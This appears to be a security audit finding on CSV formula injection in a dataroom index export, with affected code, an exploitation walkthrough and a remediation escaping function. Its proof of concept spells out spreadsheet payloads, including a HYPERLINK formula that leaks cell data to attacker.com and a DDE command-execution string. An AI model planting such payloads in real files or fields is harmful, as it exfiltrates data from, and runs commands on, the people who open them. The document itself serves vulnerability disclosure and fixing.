# Finding: CSV Injection in Dataroom Index CSV Export

## Severity
MEDIUM

## CVSS Estimate
CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N = 5.0 (attacker plants formula in document/folder name → team admin opens the exported CSV in Excel → formula fires and exfiltrates spreadsheet contents).

## Affected Code
- File: `lib/dataroom/index-generator.ts`
- Line: 368-382 (the `case "csv":` branch: `csvContent = csvRows.map((row) => row.join(",")).join("\n")`)
- Function: anonymous arrow inside `case "csv":`
- Endpoint: n/a — called by the dataroom archive builder at `ee/features/dataroom-freeze/lib/trigger/dataroom-freeze-archive.ts:357`

## Description
The XLSX branch (line 343) and the JSON branch (line 394) are safe because ExcelJS handles cell-level escaping and `JSON.stringify` does. The CSV branch is the lone exception: it does `row.join(",")` with no quoting and no formula-prefix guard. The whole `indexData` originates from `prisma.dataroomDocument.findMany` over documents/folders that the team created, so document names ARE user-controlled even though they pass through `sanitizePlainText` (`lib/utils/sanitize-html.ts:12-20`). `sanitizePlainText` strips HTML and runs `.normalize("NFC")` — it does NOT strip leading `=`, `+`, `-`, or `@`. The HTML-strip output `=HYPERLINK(...)` still has `=` at position 0.

## Proof of Concept

### Pre-conditions
- Attacker has access to create/rename a document or folder in any team the attacker is a member of (or via F-013 SAML ATO, any team on the deployment).
- A team admin triggers the dataroom freeze/archive export (which produces a CSV index alongside the JSON and XLSX).

### Step-by-step exploitation
1. Attacker renames a document to `=HYPERLINK("https://attacker.com/?leak="&A1, "Click for preview")` (or a folder name, or `=WEBSERVICE(...)`, or `=cmd|'/c calc.exe'!A1`).
2. The team's dataroom freeze job runs (or the attacker triggers it via the chain below).
3. The CSV index is written to S3 alongside the archive.
4. The team admin downloads the archive, unzips, opens the CSV in Excel.
5. The cell with the document name is rendered as a hyperlink (or executes the formula).
6. The attacker receives the spreadsheet contents (which may include other admin emails, team billing info, or other document names).

### Step-by-step chain (force the export)
- The dataroom freeze is triggered by `ee/features/dataroom-freeze/lib/trigger/dataroom-freeze-archive.ts:70` (or similar — verify the exact trigger). On self-hosted deployments, F-007 (QStash bypass) can force the cron to run.

## Impact
- **Spreadsheet exfiltration** — the attacker receives the contents of the CSV cells, which may include other admin emails, team billing info, or other document names.
- **Phishing pivot** — the cell becomes a clickable link to attacker-controlled content.
- **DDE / command execution** on older Excel versions.

## Evidence
```ts
// lib/dataroom/index-generator.ts:368-382
...indexData.entries.map((entry) => [
  ...(showHierarchicalIndex ? [entry.hierarchicalIndex] : []),
  entry.name,
  entry.type,
  entry.path,
  entry.version,
  entry.pages,
  entry.size,
  entry.onlineUrl,
  entry.mimeType,
  entry.createdAt?.toISOString(),
  entry.lastUpdated.toISOString(),
]),
const csvContent = csvRows.map((row) => row.join(",")).join("\n");
```

## Methodology
- **M2 — Encoding analysis** (`methodology-raw/01-encoding-analysis.md` Finding 2)

## Chain Potential
- **Chain 8** (`methodology-raw/05-chains.md`) — the dataroom index CSV is one leg of the CSV injection chain. The other legs are F-017 (client-side downloadCSV), F-022 (team-conversations Q&A export), and the welcomeMessage / Agreement.name write paths (F-024/F-025).

## Remediation
Route every CSV cell through `escapeCsvField` (currently in `lib/trigger/export-visits.ts:14-33`). Move it to `lib/utils/csv.ts` so all three CSV-emission sites — `downloadCSV`, the dataroom index, and the conversations export — share one implementation:
```ts
// lib/utils/csv.ts
export function escapeCsvField(value: unknown): string {
  if (value == null) return "";
  let str = String(value);
  if (/[",\n\r]/.test(str)) {
    str = `"${str.replace(/"/g, '""')}"`;
  }
  if (/^[=+\-@\t\r]/.test(str)) {
    str = `"'${str}"`;
  }
  return str;
}
```

Apply to the dataroom index CSV export, the conversations export, and `downloadCSV`.
